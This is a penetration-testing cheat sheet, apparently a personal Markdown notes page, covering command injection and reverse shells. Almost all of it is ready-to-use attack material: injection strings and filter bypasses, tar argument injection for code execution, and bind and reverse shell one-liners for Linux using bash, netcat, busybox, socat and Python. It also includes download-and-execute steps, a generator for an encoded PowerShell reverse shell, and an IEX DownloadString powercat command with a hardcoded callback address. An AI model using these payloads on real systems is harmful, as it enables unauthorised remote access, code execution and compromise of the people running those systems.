---
layout: blank
pagetitle: Command Injection & Reverse Shells
---

## Command Injection
- It's pretty self-explanatory

**Common ways of injecting commands**
- Classic `;id`, `| id`, `&& id`
- Newlines can be a pretty sneaky way of getting around a blacklist if the shell is invoked
  - `asdf %0A id`

**Argument injection**
- Little bit more fancy, useful if the shell isn't being invoked
- [GTFOBins](https://gtfobins.github.io/) comes in really handy here
- Example: let's say we have argument injection on `tar`
  - We can see that `tar` has `--checkpoint=1 --checkpoint-action=exec={command}` on GTFOBins
  - Thus, we don't actually even need a shell for command execution, we can simply fork a process running our commands from tar
    - This could look something like `--checkpoint=1 --checkpoint-action=exec=perl$IFS-e$IFS'system(join($x,map(chr,({decimal_characters_to_run}))))';`

**Check what server we're running on**
- ``dir 2>&1 \*\`|echo CMD);&<# rem #>echo PowerShell`` will check injected shell type

## Upgrading Command Injection to a Shell

- Make sure to set your listener first with `nc -lnvp {port}`
  - On mac, can just do `nc -l {port}`, though the firewall might have to be disabled

**Resources**
- A good resource here is: [Revshells](https://www.revshells.com/)
  - Can set the IP/port, and it will dynamically generate the payload

**Linux Bind Shells**
- Socat seems to be pretty solid: `socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`
  - Then, on attacker machine: ``socat FILE:`tty`,raw,echo=0 TCP:target.com:{port}``
- Python: `python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
- NC: `nc -nlvp {port} -e /bin/bash`

**Linux Reverse shells**
- `bash -i >& /dev/tcp/{IP}/{port} 0>&1`
- `busybox nc {IP} {port} -e sh` or `busybox nc {IP} {port} -e /bin/sh`
- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
- If we're restricted in characters, the best way to usually do it is to get a script on the system, and execute that
  - `wget {IP}:{port}/script.sh` -> `chmod 777 ./script.sh` -> `./script.sh`

**Upgrading Linux Shell to a Better Shell**
- `script /dev/null -c bash`
  - Then background the existing shell with CTRL Z
  - Then on kali: `stty raw -echo; fg` (to continue the process)
  - Finally type `reset` then set the terminal type to `screen`
- Alternatively try one of these:

```sh 
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

**Windows Reverse Shells**
- Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
  - Then run `C:\Windows\Temp\nc.exe -e powershell.exe {IP} {port}` for a Powershell reverse shell
- Can also just do it with powershell alone - use this python script to generate the payload:

```py
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())
```

- Run [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) - `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c 192.168.45.220 -p 4444 -e powershell`


